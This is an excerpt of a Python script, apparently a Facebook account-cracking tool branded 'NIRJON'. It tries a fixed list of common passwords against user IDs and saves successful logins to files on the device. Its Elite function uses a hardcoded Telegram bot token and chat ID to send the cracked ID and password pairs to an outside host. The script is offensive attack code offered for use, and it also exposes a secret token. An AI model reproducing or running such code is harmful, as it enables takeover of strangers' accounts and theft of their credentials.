...
#--------------------< SYS >--------------------#
sys.stdout.write('\x1b]2; <[NIRJON-XD]>\x07')
#--------------------< COLOUR >--------------------#
...
def Elite(uid,ps,coki):
    try:
        import requests
        token = "8045792873:AAEWwsVGv4fuji-7VKVg1XmpkxxAZg9fzxg"#Add yout token 
        chatid = "7118615249"#Add your Chat Id
        ok_id =str(uid+'|'+pw)
...
def login(uid):
    ...
    try:
        sys.stdout.write(f'\r\r{R}<{W}={R}>{W}-{R}<{G}NIRJON-NAHUEL{R}> {W}-{R}|{T}{loop}\x1b[38;5;8m{R}|{W}-{R}|{P}{len(oks)}{R}|')
        sys.stdout.flush()
        for pw in ["123456","1234567","12345678","123456789","123123","143143","87654321","987654321","77889900","000000l"]:
            ...
            if "session_key" in rp:
                print(f'\r\r{R}<{W}={R}>{W}-{R}<{G}NIRJON-OK{R}>{G} {uid} {R}•{G} {pw}')
                open("/sdcard/NIRJON-OLD-OK","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break 
            elif "www.facebook.com" in rp["error_msg"]:
                print(f'\r\r{R}<{W}={R}>{W}-{R}<{G}NIRJON-OLD{R}>{G} {uid} {R}•{G} {pw}')
                ProfileLink=f"https://www.facebook.com/profile.php?id={uid}"
                print(f'\r\r{R}<{W}={R}>{W}-{R}<{G}{G} PROFILE LINK {G}➤{W} {ProfileLink}');lin()
                open("/sdcard/NIRJON-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                Elite(uid,ps,coki)
                oks.append(uid)
                break
